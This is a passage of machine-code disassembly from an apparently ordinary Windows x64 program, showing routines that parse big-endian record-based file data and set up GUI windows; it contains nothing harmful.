   140001742:	4c 8d 05 bf a0 02 00 	lea    0x2a0bf(%rip),%r8        # 0x14002b808
   140001749:	48 8d 0d 14 a0 02 00 	lea    0x2a014(%rip),%rcx        # 0x14002b764
   140001750:	8b 10                	mov    (%rax),%edx
   140001752:	e8 b9 11 00 00       	call   0x140002910
   140001757:	bb ff ff ff ff       	mov    $0xffffffff,%ebx
   14000175c:	e9 ae 00 00 00       	jmp    0x14000180f
   140001761:	48 89 74 24 58       	mov    %rsi,0x58(%rsp)
   140001766:	8b 77 0c             	mov    0xc(%rdi),%esi
   140001769:	48 85 f6             	test   %rsi,%rsi
   14000176c:	0f 84 90 00 00 00    	je     0x140001802
   140001772:	48 89 6c 24 50       	mov    %rbp,0x50(%rsp)
   140001777:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   14000177e:	00 00 
   140001780:	49 3b f5             	cmp    %r13,%rsi
   140001783:	48 8b ee             	mov    %rsi,%rbp
   140001786:	4d 8b cf             	mov    %r15,%r9
   140001789:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   14000178f:	49 0f 47 ed          	cmova  %r13,%rbp
   140001793:	49 8b ce             	mov    %r14,%rcx
   140001796:	48 8b d5             	mov    %rbp,%rdx
   140001799:	e8 6e ec 00 00       	call   0x14001040c
   14000179e:	48 83 f8 01          	cmp    $0x1,%rax
   1400017a2:	72 36                	jb     0x1400017da
   1400017a4:	4d 8b cc             	mov    %r12,%r9
   1400017a7:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   1400017ad:	48 8b d5             	mov    %rbp,%rdx
   1400017b0:	49 8b ce             	mov    %r14,%rcx
   1400017b3:	e8 94 f3 00 00       	call   0x140010b4c
   1400017b8:	48 83 f8 01          	cmp    $0x1,%rax
   1400017bc:	72 07                	jb     0x1400017c5
   1400017be:	48 2b f5             	sub    %rbp,%rsi
   1400017c1:	75 bd                	jne    0x140001780
   1400017c3:	eb 38                	jmp    0x1400017fd
   1400017c5:	e8 ae 37 01 00       	call   0x140014f78
   1400017ca:	4c 8d 05 b7 a0 02 00 	lea    0x2a0b7(%rip),%r8        # 0x14002b888
   1400017d1:	48 8d 0d e4 a0 02 00 	lea    0x2a0e4(%rip),%rcx        # 0x14002b8bc
   1400017d8:	eb 13                	jmp    0x1400017ed
   1400017da:	e8 99 37 01 00       	call   0x140014f78
   1400017df:	4c 8d 05 62 a0 02 00 	lea    0x2a062(%rip),%r8        # 0x14002b848
   1400017e6:	48 8d 0d 8f a0 02 00 	lea    0x2a08f(%rip),%rcx        # 0x14002b87c
   1400017ed:	8b 10                	mov    (%rax),%edx
   1400017ef:	4c 8d 4f 12          	lea    0x12(%rdi),%r9
   1400017f3:	e8 18 11 00 00       	call   0x140002910
   1400017f8:	bb ff ff ff ff       	mov    $0xffffffff,%ebx
   1400017fd:	48 8b 6c 24 50       	mov    0x50(%rsp),%rbp
   140001802:	49 8b ce             	mov    %r14,%rcx
   140001805:	e8 96 37 01 00       	call   0x140014fa0
   14000180a:	48 8b 74 24 58       	mov    0x58(%rsp),%rsi
   14000180f:	4c 8b 6c 24 30       	mov    0x30(%rsp),%r13
   140001814:	4c 8b 74 24 28       	mov    0x28(%rsp),%r14
   140001819:	49 8b cf             	mov    %r15,%rcx
   14000181c:	e8 9b e8 00 00       	call   0x1400100bc
   140001821:	49 8b cc             	mov    %r12,%rcx
   140001824:	e8 93 e8 00 00       	call   0x1400100bc
   140001829:	4c 8b 7c 24 20       	mov    0x20(%rsp),%r15
   14000182e:	8b c3                	mov    %ebx,%eax
   140001830:	4c 8b 64 24 60       	mov    0x60(%rsp),%r12
   140001835:	48 83 c4 38          	add    $0x38,%rsp
   140001839:	5f                   	pop    %rdi
   14000183a:	5b                   	pop    %rbx
   14000183b:	c3                   	ret
   14000183c:	cc                   	int3
   14000183d:	cc                   	int3
   14000183e:	cc                   	int3
   14000183f:	cc                   	int3
   140001840:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140001845:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   14000184a:	57                   	push   %rdi
   14000184b:	48 83 ec 20          	sub    $0x20,%rsp
   14000184f:	48 8b 99 08 10 00 00 	mov    0x1008(%rcx),%rbx
   140001856:	48 8b f2             	mov    %rdx,%rsi
   140001859:	48 8b f9             	mov    %rcx,%rdi
   14000185c:	48 3b 99 10 10 00 00 	cmp    0x1010(%rcx),%rbx
   140001863:	73 70                	jae    0x1400018d5
   140001865:	66 66 66 0f 1f 84 00 	data16 data16 nopw 0x0(%rax,%rax,1)
   14000186c:	00 00 00 00 
   140001870:	44 0f b6 43 11       	movzbl 0x11(%rbx),%r8d
   140001875:	41 8d 40 a6          	lea    -0x5a(%r8),%eax
   140001879:	a8 f7                	test   $0xf7,%al
   14000187b:	74 3a                	je     0x1400018b7
   14000187d:	41 80 f8 64          	cmp    $0x64,%r8b
   140001881:	74 34                	je     0x1400018b7
   140001883:	41 80 f8 6e          	cmp    $0x6e,%r8b
   140001887:	74 2e                	je     0x1400018b7
   140001889:	41 80 f8 78          	cmp    $0x78,%r8b
   14000188d:	74 28                	je     0x1400018b7
   14000188f:	48 8d 43 12          	lea    0x12(%rbx),%rax
   140001893:	4c 8b c6             	mov    %rsi,%r8
   140001896:	4c 2b c0             	sub    %rax,%r8
   140001899:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   1400018a0:	0f b6 10             	movzbl (%rax),%edx
   1400018a3:	42 0f b6 0c 00       	movzbl (%rax,%r8,1),%ecx
   1400018a8:	2b d1                	sub    %ecx,%edx
   1400018aa:	75 07                	jne    0x1400018b3
   1400018ac:	48 ff c0             	inc    %rax
   1400018af:	85 c9                	test   %ecx,%ecx
   1400018b1:	75 ed                	jne    0x1400018a0
   1400018b3:	85 d2                	test   %edx,%edx
   1400018b5:	eb 0e                	jmp    0x1400018c5
   1400018b7:	48 8d 4b 12          	lea    0x12(%rbx),%rcx
   1400018bb:	48 8b d6             	mov    %rsi,%rdx
   1400018be:	e8 d1 37 01 00       	call   0x140015094
   1400018c3:	85 c0                	test   %eax,%eax
   1400018c5:	74 20                	je     0x1400018e7
   1400018c7:	8b 03                	mov    (%rbx),%eax
   1400018c9:	48 03 d8             	add    %rax,%rbx
   1400018cc:	48 3b 9f 10 10 00 00 	cmp    0x1010(%rdi),%rbx
   1400018d3:	72 9b                	jb     0x140001870
   1400018d5:	33 c0                	xor    %eax,%eax
   1400018d7:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400018dc:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   1400018e1:	48 83 c4 20          	add    $0x20,%rsp
   1400018e5:	5f                   	pop    %rdi
   1400018e6:	c3                   	ret
   1400018e7:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   1400018ec:	48 8b c3             	mov    %rbx,%rax
   1400018ef:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400018f4:	48 83 c4 20          	add    $0x20,%rsp
   1400018f8:	5f                   	pop    %rdi
   1400018f9:	c3                   	ret
   1400018fa:	cc                   	int3
   1400018fb:	cc                   	int3
   1400018fc:	cc                   	int3
   1400018fd:	cc                   	int3
   1400018fe:	cc                   	int3
   1400018ff:	cc                   	int3
   140001900:	40 53                	rex push %rbx
   140001902:	48 83 ec 20          	sub    $0x20,%rsp
   140001906:	48 8b 19             	mov    (%rcx),%rbx
   140001909:	48 c7 01 00 00 00 00 	movq   $0x0,(%rcx)
   140001910:	48 85 db             	test   %rbx,%rbx
   140001913:	74 19                	je     0x14000192e
   140001915:	48 8b 8b 08 10 00 00 	mov    0x1008(%rbx),%rcx
   14000191c:	e8 7f 36 01 00       	call   0x140014fa0
   140001921:	48 8b cb             	mov    %rbx,%rcx
   140001924:	48 83 c4 20          	add    $0x20,%rsp
   140001928:	5b                   	pop    %rbx
   140001929:	e9 72 36 01 00       	jmp    0x140014fa0
   14000192e:	48 83 c4 20          	add    $0x20,%rsp
   140001932:	5b                   	pop    %rbx
   140001933:	c3                   	ret
   140001934:	cc                   	int3
   140001935:	cc                   	int3
   140001936:	cc                   	int3
   140001937:	cc                   	int3
   140001938:	cc                   	int3
   140001939:	cc                   	int3
   14000193a:	cc                   	int3
   14000193b:	cc                   	int3
   14000193c:	cc                   	int3
   14000193d:	cc                   	int3
   14000193e:	cc                   	int3
   14000193f:	cc                   	int3
   140001940:	8b 02                	mov    (%rdx),%eax
   140001942:	48 03 c2             	add    %rdx,%rax
   140001945:	c3                   	ret
   140001946:	cc                   	int3
   140001947:	cc                   	int3
   140001948:	cc                   	int3
   140001949:	cc                   	int3
   14000194a:	cc                   	int3
   14000194b:	cc                   	int3
   14000194c:	cc                   	int3
   14000194d:	cc                   	int3
   14000194e:	cc                   	int3
   14000194f:	cc                   	int3
   140001950:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   140001955:	48 89 6c 24 20       	mov    %rbp,0x20(%rsp)
   14000195a:	57                   	push   %rdi
   14000195b:	48 81 ec 90 00 00 00 	sub    $0x90,%rsp
   140001962:	48 8b 05 d7 c6 03 00 	mov    0x3c6d7(%rip),%rax        # 0x14003e040
   140001969:	48 33 c4             	xor    %rsp,%rax
   14000196c:	48 89 84 24 88 00 00 	mov    %rax,0x88(%rsp)
   140001973:	00 
   140001974:	48 8d 15 49 9f 02 00 	lea    0x29f49(%rip),%rdx        # 0x14002b8c4
   14000197b:	48 8b e9             	mov    %rcx,%rbp
   14000197e:	33 db                	xor    %ebx,%ebx
   140001980:	e8 2b 2c 00 00       	call   0x1400045b0
   140001985:	48 8b f8             	mov    %rax,%rdi
   140001988:	48 85 c0             	test   %rax,%rax
   14000198b:	0f 84 bd 02 00 00    	je     0x140001c4e
   140001991:	48 8b 05 a0 bb 02 00 	mov    0x2bba0(%rip),%rax        # 0x14002d538
   140001998:	48 8d 94 24 80 00 00 	lea    0x80(%rsp),%rdx
   14000199f:	00 
   1400019a0:	48 89 84 24 80 00 00 	mov    %rax,0x80(%rsp)
   1400019a7:	00 
   1400019a8:	41 b8 08 00 00 00    	mov    $0x8,%r8d
   1400019ae:	48 c1 e8 18          	shr    $0x18,%rax
   1400019b2:	48 8b cf             	mov    %rdi,%rcx
   1400019b5:	04 0c                	add    $0xc,%al
   1400019b7:	48 89 b4 24 a8 00 00 	mov    %rsi,0xa8(%rsp)
   1400019be:	00 
   1400019bf:	88 84 24 83 00 00 00 	mov    %al,0x83(%rsp)
   1400019c6:	e8 b5 65 00 00       	call   0x140007f80
   1400019cb:	48 8b f0             	mov    %rax,%rsi
   1400019ce:	48 85 c0             	test   %rax,%rax
   1400019d1:	0f 84 64 02 00 00    	je     0x140001c3b
   1400019d7:	45 33 c0             	xor    %r8d,%r8d
   1400019da:	48 8b d0             	mov    %rax,%rdx
   1400019dd:	48 8b cf             	mov    %rdi,%rcx
   1400019e0:	e8 5f ed 00 00       	call   0x140010744
   1400019e5:	85 c0                	test   %eax,%eax
   1400019e7:	79 1f                	jns    0x140001a08
   1400019e9:	e8 8a 35 01 00       	call   0x140014f78
   1400019ee:	4c 8d 05 0b a0 02 00 	lea    0x2a00b(%rip),%r8        # 0x14002ba00
   1400019f5:	48 8d 0d 40 9f 02 00 	lea    0x29f40(%rip),%rcx        # 0x14002b93c
   1400019fc:	8b 10                	mov    (%rax),%edx
   1400019fe:	e8 0d 0f 00 00       	call   0x140002910
   140001a03:	e9 33 02 00 00       	jmp    0x140001c3b
   140001a08:	4c 8b cf             	mov    %rdi,%r9
   140001a0b:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140001a10:	ba 58 00 00 00       	mov    $0x58,%edx
   140001a15:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   140001a1b:	e8 ec e9 00 00       	call   0x14001040c
   140001a20:	48 83 f8 01          	cmp    $0x1,%rax
   140001a24:	73 1f                	jae    0x140001a45
   140001a26:	e8 4d 35 01 00       	call   0x140014f78
   140001a2b:	4c 8d 05 f6 9f 02 00 	lea    0x29ff6(%rip),%r8        # 0x14002ba28
   140001a32:	48 8d 0d 43 9e 02 00 	lea    0x29e43(%rip),%rcx        # 0x14002b87c
   140001a39:	8b 10                	mov    (%rax),%edx
   140001a3b:	e8 d0 0e 00 00       	call   0x140002910
   140001a40:	e9 f6 01 00 00       	jmp    0x140001c3b
   140001a45:	ba 70 10 00 00       	mov    $0x1070,%edx
   140001a4a:	b9 01 00 00 00       	mov    $0x1,%ecx
   140001a4f:	e8 44 35 01 00       	call   0x140014f98
   140001a54:	48 8b d8             	mov    %rax,%rbx
   140001a57:	48 85 c0             	test   %rax,%rax
   140001a5a:	75 1f                	jne    0x140001a7b
   140001a5c:	e8 17 35 01 00       	call   0x140014f78
   140001a61:	4c 8d 05 d8 9f 02 00 	lea    0x29fd8(%rip),%r8        # 0x14002ba40
   140001a68:	48 8d 0d 05 a0 02 00 	lea    0x2a005(%rip),%rcx        # 0x14002ba74
   140001a6f:	8b 10                	mov    (%rax),%edx
   140001a71:	e8 9a 0e 00 00       	call   0x140002910
   140001a76:	e9 c0 01 00 00       	jmp    0x140001c3b
   140001a7b:	4c 8b cd             	mov    %rbp,%r9
   140001a7e:	4c 8d 05 f7 9f 02 00 	lea    0x29ff7(%rip),%r8        # 0x14002ba7c
   140001a85:	ba 00 10 00 00       	mov    $0x1000,%edx
   140001a8a:	48 8b cb             	mov    %rbx,%rcx
   140001a8d:	e8 ee 01 00 00       	call   0x140001c80
   140001a92:	8b 44 24 28          	mov    0x28(%rsp),%eax
   140001a96:	48 8d 8b 2c 10 00 00 	lea    0x102c(%rbx),%rcx
   140001a9d:	0f c8                	bswap  %eax
   140001a9f:	89 44 24 28          	mov    %eax,0x28(%rsp)
   140001aa3:	4c 8d 4c 24 38       	lea    0x38(%rsp),%r9
   140001aa8:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   140001aac:	4c 8d 05 c9 9f 02 00 	lea    0x29fc9(%rip),%r8        # 0x14002ba7c
   140001ab3:	0f c8                	bswap  %eax
   140001ab5:	89 44 24 2c          	mov    %eax,0x2c(%rsp)
   140001ab9:	ba 40 00 00 00       	mov    $0x40,%edx
   140001abe:	8b 44 24 30          	mov    0x30(%rsp),%eax
   140001ac2:	0f c8                	bswap  %eax
   140001ac4:	89 44 24 30          	mov    %eax,0x30(%rsp)
   140001ac8:	8b 44 24 34          	mov    0x34(%rsp),%eax
   140001acc:	0f c8                	bswap  %eax
   140001ace:	89 44 24 34          	mov    %eax,0x34(%rsp)
   140001ad2:	89 83 28 10 00 00    	mov    %eax,0x1028(%rbx)
   140001ad8:	e8 a3 01 00 00       	call   0x140001c80
   140001add:	8b 44 24 28          	mov    0x28(%rsp),%eax
   140001ae1:	45 33 c0             	xor    %r8d,%r8d
   140001ae4:	48 2b f0             	sub    %rax,%rsi
   140001ae7:	48 8b cf             	mov    %rdi,%rcx
   140001aea:	48 8d 46 58          	lea    0x58(%rsi),%rax
   140001aee:	48 89 83 00 10 00 00 	mov    %rax,0x1000(%rbx)
   140001af5:	8b 54 24 2c          	mov    0x2c(%rsp),%edx
   140001af9:	48 03 d0             	add    %rax,%rdx
   140001afc:	e8 43 ec 00 00       	call   0x140010744
   140001b01:	8b 4c 24 30          	mov    0x30(%rsp),%ecx
   140001b05:	e8 aa 34 01 00       	call   0x140014fb4
   140001b0a:	48 89 83 08 10 00 00 	mov    %rax,0x1008(%rbx)
   140001b11:	48 85 c0             	test   %rax,%rax
   140001b14:	75 1f                	jne    0x140001b35
   140001b16:	e8 5d 34 01 00       	call   0x140014f78
   140001b1b:	4c 8d 05 5e 9f 02 00 	lea    0x29f5e(%rip),%r8        # 0x14002ba80
   140001b22:	48 8d 0d 3b 9c 02 00 	lea    0x29c3b(%rip),%rcx        # 0x14002b764
   140001b29:	8b 10                	mov    (%rax),%edx
   140001b2b:	e8 e0 0d 00 00       	call   0x140002910
   140001b30:	e9 06 01 00 00       	jmp    0x140001c3b
   140001b35:	8b 54 24 30          	mov    0x30(%rsp),%edx
   140001b39:	4c 8b cf             	mov    %rdi,%r9
   140001b3c:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   140001b42:	48 8b c8             	mov    %rax,%rcx
   140001b45:	e8 c2 e8 00 00       	call   0x14001040c
   140001b4a:	48 83 f8 01          	cmp    $0x1,%rax
   140001b4e:	73 1f                	jae    0x140001b6f
   140001b50:	e8 23 34 01 00       	call   0x140014f78
   140001b55:	4c 8d 05 4c 9f 02 00 	lea    0x29f4c(%rip),%r8        # 0x14002baa8
   140001b5c:	48 8d 0d 19 9d 02 00 	lea    0x29d19(%rip),%rcx        # 0x14002b87c
   140001b63:	8b 10                	mov    (%rax),%edx
   140001b65:	e8 a6 0d 00 00       	call   0x140002910
   140001b6a:	e9 cc 00 00 00       	jmp    0x140001c3b
   140001b6f:	8b 44 24 30          	mov    0x30(%rsp),%eax
   140001b73:	48 8b cf             	mov    %rdi,%rcx
   140001b76:	48 03 83 08 10 00 00 	add    0x1008(%rbx),%rax
   140001b7d:	48 89 83 10 10 00 00 	mov    %rax,0x1010(%rbx)
   140001b84:	e8 f7 e5 00 00       	call   0x140010180
   140001b89:	85 c0                	test   %eax,%eax
   140001b8b:	74 11                	je     0x140001b9e
   140001b8d:	48 8d 0d 34 9f 02 00 	lea    0x29f34(%rip),%rcx        # 0x14002bac8
   140001b94:	e8 77 0b 00 00       	call   0x140002710
   140001b99:	e9 9d 00 00 00       	jmp    0x140001c3b
   140001b9e:	48 8b 93 08 10 00 00 	mov    0x1008(%rbx),%rdx
   140001ba5:	48 3b 93 10 10 00 00 	cmp    0x1010(%rbx),%rdx
   140001bac:	0f 83 89 00 00 00    	jae    0x140001c3b
   140001bb2:	44 8b 05 5f c4 03 00 	mov    0x3c45f(%rip),%r8d        # 0x14003e018
   140001bb9:	66 0f 6f 0d 1f 9f 02 	movdqa 0x29f1f(%rip),%xmm1        # 0x14002bae0
   140001bc0:	00 
   140001bc1:	33 c0                	xor    %eax,%eax
   140001bc3:	41 83 f8 02          	cmp    $0x2,%r8d
   140001bc7:	7c 17                	jl     0x140001be0
   140001bc9:	f3 0f 6f 02          	movdqu (%rdx),%xmm0
   140001bcd:	66 0f 38 00 c1       	pshufb %xmm1,%xmm0
   140001bd2:	f3 0f 7f 02          	movdqu %xmm0,(%rdx)
   140001bd6:	eb 19                	jmp    0x140001bf1
   140001bd8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   140001bdf:	00 
   140001be0:	8b 0c 82             	mov    (%rdx,%rax,4),%ecx
   140001be3:	0f c9                	bswap  %ecx
   140001be5:	89 0c 82             	mov    %ecx,(%rdx,%rax,4)
   140001be8:	48 ff c0             	inc    %rax
   140001beb:	48 83 f8 04          	cmp    $0x4,%rax
   140001bef:	7c ef                	jl     0x140001be0
   140001bf1:	0f b6 4a 11          	movzbl 0x11(%rdx),%ecx
   140001bf5:	8d 41 a6             	lea    -0x5a(%rcx),%eax
   140001bf8:	a8 f7                	test   $0xf7,%al
   140001bfa:	74 13                	je     0x140001c0f
   140001bfc:	80 f9 64             	cmp    $0x64,%cl
   140001bff:	74 0e                	je     0x140001c0f
   140001c01:	80 f9 6e             	cmp    $0x6e,%cl
   140001c04:	74 09                	je     0x140001c0f
   140001c06:	80 f9 78             	cmp    $0x78,%cl
   140001c09:	74 04                	je     0x140001c0f
   140001c0b:	32 c0                	xor    %al,%al
   140001c0d:	eb 02                	jmp    0x140001c11
   140001c0f:	b0 01                	mov    $0x1,%al
   140001c11:	0a 83 18 10 00 00    	or     0x1018(%rbx),%al
   140001c17:	0f 95 c0             	setne  %al
   140001c1a:	88 83 18 10 00 00    	mov    %al,0x1018(%rbx)
   140001c20:	80 7a 11 6c          	cmpb   $0x6c,0x11(%rdx)
   140001c24:	75 07                	jne    0x140001c2d
   140001c26:	48 89 93 20 10 00 00 	mov    %rdx,0x1020(%rbx)
   140001c2d:	8b 02                	mov    (%rdx),%eax
   140001c2f:	48 03 d0             	add    %rax,%rdx
   140001c32:	48 3b 93 10 10 00 00 	cmp    0x1010(%rbx),%rdx
   140001c39:	72 86                	jb     0x140001bc1
   140001c3b:	48 8b cf             	mov    %rdi,%rcx
   140001c3e:	e8 79 e4 00 00       	call   0x1400100bc
   140001c43:	48 8b b4 24 a8 00 00 	mov    0xa8(%rsp),%rsi
   140001c4a:	00 
   140001c4b:	48 8b c3             	mov    %rbx,%rax
   140001c4e:	48 8b 8c 24 88 00 00 	mov    0x88(%rsp),%rcx
   140001c55:	00 
   140001c56:	48 33 cc             	xor    %rsp,%rcx
   140001c59:	e8 62 a9 00 00       	call   0x14000c5c0
   140001c5e:	4c 8d 9c 24 90 00 00 	lea    0x90(%rsp),%r11
   140001c65:	00 
   140001c66:	49 8b 5b 20          	mov    0x20(%r11),%rbx
   140001c6a:	49 8b 6b 28          	mov    0x28(%r11),%rbp
   140001c6e:	49 8b e3             	mov    %r11,%rsp
   140001c71:	5f                   	pop    %rdi
   140001c72:	c3                   	ret
   140001c73:	cc                   	int3
   140001c74:	cc                   	int3
   140001c75:	cc                   	int3
   140001c76:	cc                   	int3
   140001c77:	cc                   	int3
   140001c78:	cc                   	int3
   140001c79:	cc                   	int3
   140001c7a:	cc                   	int3
   140001c7b:	cc                   	int3
   140001c7c:	cc                   	int3
   140001c7d:	cc                   	int3
   140001c7e:	cc                   	int3
   140001c7f:	cc                   	int3
   140001c80:	4c 89 44 24 18       	mov    %r8,0x18(%rsp)
   140001c85:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   140001c8a:	53                   	push   %rbx
   140001c8b:	55                   	push   %rbp
   140001c8c:	56                   	push   %rsi
   140001c8d:	57                   	push   %rdi
   140001c8e:	48 83 ec 38          	sub    $0x38,%rsp
   140001c92:	49 8b f0             	mov    %r8,%rsi
   140001c95:	48 8d 6c 24 78       	lea    0x78(%rsp),%rbp
   140001c9a:	48 8b da             	mov    %rdx,%rbx
   140001c9d:	48 8b f9             	mov    %rcx,%rdi
   140001ca0:	e8 9b f3 ff ff       	call   0x140001040
   140001ca5:	48 89 6c 24 28       	mov    %rbp,0x28(%rsp)
   140001caa:	4c 8b ce             	mov    %rsi,%r9
   140001cad:	4c 8b c3             	mov    %rbx,%r8
   140001cb0:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   140001cb7:	00 00 
   140001cb9:	48 8b d7             	mov    %rdi,%rdx
   140001cbc:	48 8b 08             	mov    (%rax),%rcx
   140001cbf:	48 83 c9 02          	or     $0x2,%rcx
   140001cc3:	e8 2c 2d 01 00       	call   0x1400149f4
   140001cc8:	85 c0                	test   %eax,%eax
   140001cca:	b9 ff ff ff ff       	mov    $0xffffffff,%ecx
   140001ccf:	0f 48 c1             	cmovs  %ecx,%eax
   140001cd2:	48 83 c4 38          	add    $0x38,%rsp
   140001cd6:	5f                   	pop    %rdi
   140001cd7:	5e                   	pop    %rsi
   140001cd8:	5d                   	pop    %rbp
   140001cd9:	5b                   	pop    %rbx
   140001cda:	c3                   	ret
   140001cdb:	cc                   	int3
   140001cdc:	cc                   	int3
   140001cdd:	cc                   	int3
   140001cde:	cc                   	int3
   140001cdf:	cc                   	int3
   140001ce0:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140001ce5:	48 89 6c 24 18       	mov    %rbp,0x18(%rsp)
   140001cea:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   140001cef:	57                   	push   %rdi
   140001cf0:	48 81 ec 80 02 00 00 	sub    $0x280,%rsp
   140001cf7:	48 8b 05 42 c3 03 00 	mov    0x3c342(%rip),%rax        # 0x14003e040
   140001cfe:	48 33 c4             	xor    %rsp,%rax
   140001d01:	48 89 84 24 70 02 00 	mov    %rax,0x270(%rsp)
   140001d08:	00 
   140001d09:	48 8b 41 18          	mov    0x18(%rcx),%rax
   140001d0d:	4c 8d 05 dc 9d 02 00 	lea    0x29ddc(%rip),%r8        # 0x14002baf0
   140001d14:	4c 8b 49 10          	mov    0x10(%rcx),%r9
   140001d18:	48 8b f9             	mov    %rcx,%rdi
   140001d1b:	48 83 c1 28          	add    $0x28,%rcx
   140001d1f:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140001d24:	ba 00 10 00 00       	mov    $0x1000,%edx
   140001d29:	e8 92 08 00 00       	call   0x1400025c0
   140001d2e:	ff 15 3c 97 02 00    	call   *0x2973c(%rip)        # 0x14002b470
   140001d34:	0f b7 c8             	movzwl %ax,%ecx
   140001d37:	ba 32 00 00 00       	mov    $0x32,%edx
   140001d3c:	41 b8 04 00 00 00    	mov    $0x4,%r8d
   140001d42:	8b d8                	mov    %eax,%ebx
   140001d44:	ff 15 76 93 02 00    	call   *0x29376(%rip)        # 0x14002b0c0
   140001d4a:	48 c1 eb 10          	shr    $0x10,%rbx
   140001d4e:	ba 0e 00 00 00       	mov    $0xe,%edx
   140001d53:	0f b7 cb             	movzwl %bx,%ecx
   140001d56:	bb 08 00 00 00       	mov    $0x8,%ebx
   140001d5b:	44 8b c3             	mov    %ebx,%r8d
   140001d5e:	66 89 87 5a 20 00 00 	mov    %ax,0x205a(%rdi)
   140001d65:	ff 15 55 93 02 00    	call   *0x29355(%rip)        # 0x14002b0c0
   140001d6b:	33 d2                	xor    %edx,%edx
   140001d6d:	c7 87 5e 20 00 00 20 	movl   $0x200020,0x205e(%rdi)
   140001d74:	00 20 00 
   140001d77:	41 b8 f4 01 00 00    	mov    $0x1f4,%r8d
   140001d7d:	66 89 87 5c 20 00 00 	mov    %ax,0x205c(%rdi)
   140001d84:	48 8d 4c 24 74       	lea    0x74(%rsp),%rcx
   140001d89:	66 89 9f 58 20 00 00 	mov    %bx,0x2058(%rdi)
   140001d90:	e8 ab 87 02 00       	call   0x14002a540
   140001d95:	45 33 c9             	xor    %r9d,%r9d
   140001d98:	c7 44 24 70 f8 01 00 	movl   $0x1f8,0x70(%rsp)
   140001d9f:	00 
   140001da0:	4c 8d 44 24 70       	lea    0x70(%rsp),%r8
   140001da5:	ba f8 01 00 00       	mov    $0x1f8,%edx
   140001daa:	b9 29 00 00 00       	mov    $0x29,%ecx
   140001daf:	ff 15 73 96 02 00    	call   *0x29673(%rip)        # 0x14002b428
   140001db5:	33 ed                	xor    %ebp,%ebp
   140001db7:	85 c0                	test   %eax,%eax
   140001db9:	74 10                	je     0x140001dcb
   140001dbb:	48 8d 8c 24 08 02 00 	lea    0x208(%rsp),%rcx
   140001dc2:	00 
   140001dc3:	ff 15 7f 92 02 00    	call   *0x2927f(%rip)        # 0x14002b048
   140001dc9:	eb 03                	jmp    0x140001dce
   140001dcb:	48 8b c5             	mov    %rbp,%rax
   140001dce:	4c 8d 8f 50 20 00 00 	lea    0x2050(%rdi),%r9
   140001dd5:	48 89 87 48 20 00 00 	mov    %rax,0x2048(%rdi)
   140001ddc:	ba 01 7f 00 00       	mov    $0x7f01,%edx
   140001de1:	33 c9                	xor    %ecx,%ecx
   140001de3:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   140001de9:	ff 15 39 92 02 00    	call   *0x29239(%rip)        # 0x14002b028
   140001def:	48 8b 07             	mov    (%rdi),%rax
   140001df2:	48 8d 15 77 9d 02 00 	lea    0x29d77(%rip),%rdx        # 0x14002bb70
   140001df9:	48 89 6c 24 58       	mov    %rbp,0x58(%rsp)
   140001dfe:	41 b9 03 00 00 50    	mov    $0x50000003,%r9d
   140001e04:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
   140001e09:	45 33 c0             	xor    %r8d,%r8d
   140001e0c:	48 8b 47 08          	mov    0x8(%rdi),%rax
   140001e10:	33 c9                	xor    %ecx,%ecx
   140001e12:	48 89 6c 24 48       	mov    %rbp,0x48(%rsp)
   140001e17:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   140001e1c:	c7 44 24 38 00 00 00 	movl   $0x80000000,0x38(%rsp)
   140001e23:	80 
   140001e24:	c7 44 24 30 00 00 00 	movl   $0x80000000,0x30(%rsp)
   140001e2b:	80 
   140001e2c:	c7 44 24 28 00 00 00 	movl   $0x80000000,0x28(%rsp)
   140001e33:	80 
   140001e34:	c7 44 24 20 00 00 00 	movl   $0x80000000,0x20(%rsp)
   140001e3b:	80 
   140001e3c:	ff 15 76 95 02 00    	call   *0x29576(%rip)        # 0x14002b3b8
   140001e42:	48 89 6c 24 58       	mov    %rbp,0x58(%rsp)
   140001e47:	48 8d 15 22 9d 02 00 	lea    0x29d22(%rip),%rdx        # 0x14002bb70
   140001e4e:	48 89 87 28 20 00 00 	mov    %rax,0x2028(%rdi)
   140001e55:	41 b9 00 00 00 50    	mov    $0x50000000,%r9d
   140001e5b:	48 8b 07             	mov    (%rdi),%rax
   140001e5e:	45 33 c0             	xor    %r8d,%r8d
   140001e61:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
   140001e66:	33 c9                	xor    %ecx,%ecx
   140001e68:	48 8b 47 08          	mov    0x8(%rdi),%rax
   140001e6c:	48 89 6c 24 48       	mov    %rbp,0x48(%rsp)
   140001e71:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   140001e76:	c7 44 24 38 00 00 00 	movl   $0x80000000,0x38(%rsp)
   140001e7d:	80 
   140001e7e:	c7 44 24 30 00 00 00 	movl   $0x80000000,0x30(%rsp)
   140001e85:	80 
   140001e86:	c7 44 24 28 00 00 00 	movl   $0x80000000,0x28(%rsp)
   140001e8d:	80 
   140001e8e:	c7 44 24 20 00 00 00 	movl   $0x80000000,0x20(%rsp)
   140001e95:	80 
   140001e96:	ff 15 1c 95 02 00    	call   *0x2951c(%rip)        # 0x14002b3b8
   140001e9c:	48 89 6c 24 58       	mov    %rbp,0x58(%rsp)
   140001ea1:	48 8d 15 d8 9c 02 00 	lea    0x29cd8(%rip),%rdx        # 0x14002bb80
